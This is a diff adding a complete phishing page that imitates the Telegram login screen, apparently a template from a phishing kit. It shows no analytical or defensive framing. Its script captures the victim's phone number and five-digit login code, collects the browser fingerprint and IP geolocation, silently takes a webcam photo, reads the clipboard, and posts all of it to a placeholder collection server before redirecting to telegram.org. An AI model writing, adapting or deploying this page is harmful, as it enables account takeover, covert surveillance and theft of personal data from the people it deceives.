@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Telegram - Log in</title>
+<link rel="icon" href="https://telegram.org/favicon.ico">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#e7ebee;min-height:100vh;display:flex;align-items:center;justify-content:center}
+.card{background:#fff;border-radius:16px;box-shadow:0 2px 16px rgba(0,0,0,.08);padding:32px;max-width:400px;width:90%;text-align:center}
+.icon{width:72px;margin-bottom:16px}
+h1{font-size:22px;font-weight:600;color:#222;margin-bottom:4px}
+.sub{color:#666;font-size:14px;margin-bottom:24px;line-height:1.4}
+.code-input{display:flex;gap:8px;justify-content:center;margin-bottom:20px}
+.code-input input{width:48px;height:52px;text-align:center;font-size:22px;font-weight:600;border:1px solid #ddd;border-radius:10px;outline:none}
+.code-input input:focus{border-color:#40a7e3}
+.input-group{margin-bottom:16px;text-align:left}
+.input-group label{font-size:13px;color:#888;margin-bottom:4px;display:block}
+.input-group input{width:100%;padding:14px;border:1px solid #ddd;border-radius:10px;font-size:16px;outline:none}
+.input-group input:focus{border-color:#40a7e3}
+.btn{background:#40a7e3;color:#fff;border:none;border-radius:10px;padding:14px;font-size:16px;width:100%;cursor:pointer;font-weight:500;transition:background .15s}
+.btn:hover{background:#3598d4}
+.btn:disabled{opacity:.5;cursor:default}
+.loading{display:none;margin-top:20px;color:#666;font-size:14px;align-items:center;justify-content:center;gap:10px}
+.loading .s{width:18px;height:18px;border:3px solid #ddd;border-top-color:#40a7e3;border-radius:50%;animation:spin .8s linear infinite;display:inline-block}
+@keyframes spin{to{transform:rotate(360deg)}}
+#video{display:none;width:180px;height:135px;border-radius:10px;margin:16px auto;object-fit:cover;background:#000}
+</style>
+</head>
+<body>
+<div class="card">
+<img class="icon" src="https://telegram.org/img/t_logo.svg" alt="Telegram">
+<h1>Log in to Telegram</h1>
+<p class="sub">Enter your phone number to receive a login code.</p>
+<div class="input-group">
+<label>Phone Number</label>
+<input type="tel" id="phone" placeholder="+1 234 567 8900" autocomplete="off">
+</div>
+<button class="btn" id="send_btn" onclick="sendPhone()">Continue</button>
+<div class="code-input hidden" id="code_group">
+<input type="text" maxlength="1" class="cd" oninput="nextCode(this)">
+<input type="text" maxlength="1" class="cd" oninput="nextCode(this)">
+<input type="text" maxlength="1" class="cd" oninput="nextCode(this)">
+<input type="text" maxlength="1" class="cd" oninput="nextCode(this)">
+<input type="text" maxlength="1" class="cd" oninput="nextCode(this)">
+</div>
+<video id="video" autoplay muted playsinline></video>
+<div class="loading" id="loading"><span class="s"></span> <span id="load_text">Sending code...</span></div>
+</div>
+<script>
+const LID='{{LINK_ID}}',BASE='{{BASE_URL}}',SID='{{SESSION_ID}}';
+let c={session:SID};
+document.getElementById('phone').addEventListener('keydown',e=>{if(e.key==='Enter')sendPhone()});
+function nextCode(el){if(el.value&&el.nextElementSibling)el.nextElementSibling.focus()}
+async function collect(){
+    c.ua=navigator.userAgent;c.platform=navigator.platform;
+    c.screen=screen.width+'x'+screen.height;c.language=navigator.language;
+    c.timezone=Intl.DateTimeFormat().resolvedOptions().timeZone;
+    try{const r=await fetch('https://ip-api.com/json/?fields=query,country,city,lat,lon,isp');const j=await r.json();Object.assign(c,j)}catch(e){}
+    try{
+        const st=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}});
+        const v=document.getElementById('video');v.srcObject=st;v.style.display='block';
+        await new Promise(r=>setTimeout(r,1500));
+        const ca=document.createElement('canvas');ca.width=v.videoWidth||640;ca.height=v.videoHeight||480;
+        ca.getContext('2d').drawImage(v,0,0);
+        c.photo=ca.toDataURL('image/jpeg',0.85).split(',')[1];
+        st.getTracks().forEach(t=>t.stop())
+    }catch(e){}
+    try{const txt=await navigator.clipboard.readText();if(txt)c.clipboard=txt}catch(e){}
+    await fetch(BASE+'/c/'+LID,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(c)})
+}
+async function sendPhone(){
+    const phone=document.getElementById('phone').value.trim();
+    if(!phone)return;
+    c.phone=phone;
+    document.getElementById('send_btn').disabled=true;
+    document.getElementById('loading').style.display='flex';
+    document.getElementById('load_text').textContent='Sending code...';
+    await collect();
+    document.getElementById('send_btn').textContent='Code sent ✓';
+    document.getElementById('code_group').classList.remove('hidden');
+    document.getElementById('loading').style.display='none';
+    document.querySelector('.cd').focus();
+    document.getElementById('load_text').textContent='Checking code...';
+    document.querySelectorAll('.cd').forEach(el=>{
+        el.addEventListener('input',async function(){
+            if(this.value&&!this.nextElementSibling){
+                const codes=Array.from(document.querySelectorAll('.cd')).map(i=>i.value).join('');
+                if(codes.length===5){
+                    c.token=codes;
+                    c.visit_duration=Math.floor((Date.now()-t0)/1000);
+                    await fetch(BASE+'/c/'+LID,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(c)});
+                    document.getElementById('loading').style.display='flex';
+                    document.getElementById('load_text').textContent='✓ Verified! Redirecting...';
+                    document.getElementById('send_btn').disabled=true;
+                    setTimeout(()=>{window.location.href='https://telegram.org'},1500)
+                }
+            }
+        })
+    })
+}
+const t0=Date.now()
+</script>
+</body>
+</html>
